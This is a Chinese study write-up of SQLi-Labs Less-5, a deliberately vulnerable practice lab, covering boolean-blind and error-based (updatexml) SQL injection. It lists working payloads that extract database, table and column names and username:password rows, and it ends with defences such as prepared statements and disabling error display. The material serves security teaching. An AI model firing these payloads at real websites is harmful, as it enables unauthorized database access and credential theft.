# SQLi-Labs Less-5 布尔盲注 通关笔记

> 前四关都能用 `union` 把数据"塞"到页面上。
>
> **这一关不行了——页面没有回显位，只显示 `You are in`。**
>
> 于是要换思路：让数据库用"是 / 否"回答问题。

---

## 一、这题在干什么

| 项目 | 内容 |
| --- | --- |
| 靶场 | SQLi-Labs |
| 关卡 | Less-5 (Double Injection - Single Quotes - String) |
| 地址 | `http://localhost/sqli-labs/Less-5/` |
| 参数 | `id`（GET） |
| 类型 | 字符型 + **无回显位** |
| 目标 | 在"看不到数据"的情况下，把数据问出来 |

---

## 二、和前面四关最大的差别

### 2.1 代码对照

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row=mysqli_fetch_array($result, MYSQLI_BOTH);

if($row){
    echo 'You are in...........';      // ← 只打印这一句！
}else{
    print_r(mysqli_error($con1));      // ← 或者打印错误
}
```

**对比 Less-1：**

```php
echo 'Your Login name:'. $row['username'];   // ← 把数据打印出来
echo 'Your Password:' .$row['password'];
```

**Less-5 把 `$row['username']` 这个"展示口"去掉了。**

### 2.2 实测四种请求

| 请求 | 页面 | 说明 |
| --- | --- | --- |
| `?id=1` | `You are in` | 有数据 |
| `?id=1'` | SQL 报错 | 引号闭合失败 |
| `?id=1' --+` | `You are in` | 闭合成功 |
| `?id=-1' union select 1,2,3 --+` | `You are in` | **union 生效了，但看不到 1、2、3** |

### 2.3 为什么 union 在这里失效

```sql
SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3 --+'
```

**这条 SQL 是能执行的**，返回了 `1,2,3` 那一行。

但 PHP 只做了一件事：

```php
if($row){ echo 'You are in'; }
```

**它只判断"有没有行"，不打印行的内容。**

**所以 union 拿到的数据，全被丢掉了。**

### 2.4 结论

| 条件 | 能不能直接用 union 取数据 |
| --- | --- |
| 页面打印 username/password（L1~L4） | 能 |
| 页面只打印 "You are in"（L5） | **不能** |

---

## 三、两条出路

| 方法 | 原理 | 速度 |
| --- | --- | --- |
| **布尔盲注** | 用"页面有没有内容"当 true/false | 慢（一位一位问） |
| **报错注入** | 借 SQL 报错信息把数据带出来 | 快（一次一个） |

**L5 两个都能用**，因为页面既显示"有无数据"，也显示 SQL 报错。

---

## 四、方法一：布尔盲注

### 4.1 先确认盲注成立

```
?id=1' and 1=1 --+     →  You are in     （真）
?id=1' and 1=2 --+     →  （空白）        （假）
```

**这就是"布尔"：页面只有两种状态，你可以用它回答任何"是/否"问题。**

### 4.2 问库名长度

```
?id=1' and length(database())=8 --+   →  You are in   （真，长度是 8）
?id=1' and length(database())=9 --+   →  （空白）      （假）
```

**实测：库名长度 = 8。**

### 4.3 问库名内容

```sql
?id=1' and ascii(substr(database(),1,1))=115 --+
```

**实测：真 → 第 1 个字符 ASCII 115 = `s`**

```sql
?id=1' and ascii(substr(database(),2,1))=101 --+
```

**实测：真 → 第 2 个字符 ASCII 101 = `e`**

**继续问第 3~8 位，最终得到 `security`。**

### 4.4 布尔盲注的完整步骤

| 阶段 | 问什么 | 例子 |
| --- | --- | --- |
| 1 | 库名长度 | `length(database())=8` |
| 2 | 库名每一位 | `ascii(substr(database(),1,1))=115` |
| 3 | 表名总长度 | `length((select group_concat(table_name) ...))` |
| 4 | 表名每一位 | `ascii(substr((select ...),1,1))=101` |
| 5 | 字段名长度 | 同上 |
| 6 | 字段名每一位 | 同上 |
| 7 | 数据长度 | 同上 |
| 8 | 数据每一位 | 同上 |

**8 个阶段，每个阶段要问几十上百次。**

**Less-5 的库名是 8 位，光库名就要问约 8×7=56 次（二分法能减半）。**

### 4.5 为什么这么慢

| 方式 | 一次能拿多少 |
| --- | --- |
| union 注入 | **整张表** |
| 报错注入 | 32 个字符 |
| 布尔盲注 | **1 个比特**（真/假） |

**这就是"盲注"的代价。**

---

## 五、方法二：报错注入（本关更实用）

### 5.1 原理

页面会打印 `mysqli_error()`，所以可以让数据库"故意报错"，把数据放进错误信息里。

```sql
?id=1' and updatexml(1,concat(0x7e,database()),1) --+
```

**实测返回：**

```
XPATH syntax error: '~security'
```

**库名直接出来了。**

### 5.2 为什么是 `~`

`0x7e` 是 `~` 的十六进制。

`updatexml()` 的第二个参数要求是合法 XPath，`~security` 不是 → 报错 → **把 `~security` 原样打印出来。**

**用 `~` 当"标记符"，方便从报错里认出数据。**

### 5.3 实际利用

**表名：**

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name)
from information_schema.tables where table_schema=database()),0x7e),1) --+
```

实测：

```
XPATH syntax error: '~emails,referers,uagents,users~'
```

**字段名：**

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name)
from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1) --+
```

实测：

```
XPATH syntax error: '~id,username,password~'
```

**数据（一次一条）：**

```sql
?id=1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password)
from users limit 0,1),0x7e),1) --+
```

实测：

```
XPATH syntax error: '~Dumb:Dumb~'
```

**改 `limit 0,1` → `limit 1,1` → `limit 2,1`，一条条取。**

### 5.4 报错注入的 32 字符限制

`updatexml` 只显示 **32 个字符**，超出的会被截断。

**所以不能用 `group_concat` 一次拖全表，得用 `limit` 一条条来。**

| 函数 | 最大显示长度 |
| --- | --- |
| `updatexml()` | 32 字符 |
| `extractvalue()` | 32 字符 |

---

## 六、五种注入类型的全景对比

### 6.1 前五关一览

| | L1 | L2 | L3 | L4 | **L5** |
| --- | --- | --- | --- | --- | --- |
| 类型 | 字符型 | 数字型 | 单引号+括号 | 双引号+括号 | **字符型（同 L1）** |
| 后台写法 | `id='$id'` | `id=$id` | `id=('$id')` | `id=("$id")` | `id='$id'` |
| 闭合符 | `'` | 无 | `')` | `")` | **`'`** |
| 有回显位吗 | ✅ | ✅ | ✅ | ✅ | ❌ **没有** |
| 能用 union 取数据吗 | ✅ | ✅ | ✅ | ✅ | ❌ **不能** |
| 主打方法 | 联合注入 | 联合注入 | 联合注入 | 联合注入 | **盲注 / 报错注入** |

### 6.2 关键转折

**前四关的难点在"怎么闭合"，第五关的难点在"怎么看到结果"。**

```
L1~L4：闭合 → union → 数据出现在页面上
              ↑
         这条路走得通，因为页面会打印数据

L5：   闭合 → union → 数据被丢掉了
              ↑
         必须换成"是/否"或者"报错"来传数据
```

### 6.3 闭合方式没变

**注意：Less-5 的闭合和 Less-1 完全一样（`id='$id'`）。**

```
?id=1'        → 报错
?id=1' --+    → You are in
?id=-1' union select 1,2,3 --+  → You are in（但看不到 1,2,3）
```

**所以判断闭合的功夫没白学，变的只是"怎么把数据运出来"。**

### 6.4 方法选择表

| 场景 | 用什么 |
| --- | --- |
| 有回显位 | union 联合注入 |
| 无回显位，但显示报错 | **报错注入**（L5 就是这种） |
| 无回显位，无报错，只有"对/错" | 布尔盲注 |
| 连"对/错"都看不出 | 时间盲注 |

**L5 属于"第二档"——没有回显位，但有报错。**

---

## 七、知识点与笔记

### 7.1 布尔盲注的三个函数

| 函数 | 作用 | 例子 |
| --- | --- | --- |
| `length()` | 求长度 | `length(database())=8` |
| `substr()` | 截取字符 | `substr(database(),1,1)` |
| `ascii()` | 转 ASCII 码 | `ascii('s')=115` |

**三者配合：`ascii(substr(database(),1,1))=115`**

### 7.2 报错注入的两个函数

| 函数 | 用法 |
| --- | --- |
| `updatexml(XML, XPath, new)` | `updatexml(1,concat(0x7e,数据,0x7e),1)` |
| `extractvalue(XML, XPath)` | `extractvalue(1,concat(0x7e,数据,0x7e))` |

**两个都是"第二个参数不是合法 XPath"就报错，并把内容打出来。**

### 7.3 为什么用 `concat(0x7e, 数据, 0x7e)`

```
~security~
└──┬───┘
  标记符
```

**方便在报错信息里一眼认出"哪部分是数据"。**

### 7.4 常用 ASCII 值

| 字符 | ASCII |
| --- | --- |
| `0`–`9` | 48–57 |
| `A`–`Z` | 65–90 |
| `a`–`z` | 97–122 |
| `:` | 58 |
| `,` | 44 |

**（`: ` 和 `,` 也常需要，因为 `group_concat` 会用逗号分隔）**

### 7.5 二分法提速

猜 ASCII 时不要从 1 试到 128：

```sql
ascii(substr(database(),1,1)) > 64     -- 真
ascii(substr(database(),1,1)) > 96     -- 真
ascii(substr(database(),1,1)) > 112    -- 真
ascii(substr(database(),1,1)) > 120    -- 假
```

**7 次就能定位一个字符（128 的一半的对数）。**

### 7.6 自动化的必要性

手工盲注一个库名要上百次请求。

**所以真实场景都用工具：**

| 工具 | 用法 |
| --- | --- |
| sqlmap | `sqlmap -u "http://.../Less-5/?id=1" --batch` |
| Burp Intruder | 批量发请求 |
| 自写 Python 脚本 | 二分法 + 多线程 |

**但手做一遍，才能理解工具在干什么。**

---

## 八、防御怎么写

### 8.1 关闭报错（第一条）

```php
// php.ini
display_errors = Off
```

**报错注入能成立，完全依赖"页面打印 SQL 错误"。**

**这一条关掉，报错注入直接失效。**

### 8.2 预编译（根本解）

```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->bind_param('s', $id);
$stmt->execute();
```

**`?` 占位符让输入永远是数据。**

### 8.3 统一错误页

```php
try {
    $result = $mysqli->query($sql);
} catch (Exception $e) {
    error_log($e->getMessage());      // 日志里记录
    echo "系统繁忙，请稍后再试";       // 页面上不显示细节
}
```

**把错误写进日志，不给用户看。**

### 8.4 为什么盲注也要防

**盲注虽然没有回显，但它是"能问出答案"的。**

| 防御层 | 作用 |
| --- | --- |
| 预编译 | 从根上堵住 |
| 关闭报错 | 让报错注入失效 |
| 限流 | 让盲注的几十万次请求变慢/被拦 |
| WAF | 拦 `and` `substr` `ascii` 等关键词 |

### 8.5 最关键的一条

> **永远不要让用户输入进入 SQL 语句的结构里。**

**不管是回显、盲注还是报错，都是"输入变成语法"的后果。**

**预编译一上，全部失效。**

---

## 九、总结

### 本关的两个方法

| 方法 | payload 示例 | 输出 |
| --- | --- | --- |
| 布尔盲注 | `?id=1' and length(database())=8 --+` | `You are in` / 空白 |
| 报错注入 | `?id=1' and updatexml(1,concat(0x7e,database()),1) --+` | `~security` |

### 和前四关的核心区别

| | 前四关 | Less-5 |
| --- | --- | --- |
| 难点 | 闭合方式 | **怎么看到结果** |
| 页面输出 | 用户名 + 密码 | **只有 `You are in`** |
| 主打方法 | union | **盲注 / 报错** |
| 一次能拿多少 | 整张表 | 1 个比特 / 32 个字符 |

### 一句话

> **前四关教你"怎么把话说进去"，第五关教你"怎么把话听回来"。**
>
> **没有回显位，就只能一个比特一个比特地问。**

### 五关一起记

| 关卡 | 闭合 | 关键障碍 | 方法 |
| --- | --- | --- | --- |
| Less-1 | `'` | 无 | 联合注入 |
| Less-2 | 无 | 无 | 联合注入 |
| Less-3 | `')` | 括号 | 联合注入 |
| Less-4 | `")` | 双引号 | 联合注入 |
| **Less-5** | `'` | **没回显位** | **盲注 / 报错** |

---

## 参考

- [sqli-labs GitHub](https://github.com/Audi-1/sqli-labs)
- [sqli-labs php7 兼容版](https://github.com/happygongzhuo/sqli-labs-php7)
- [OWASP: Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [MySQL: updatexml](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html)
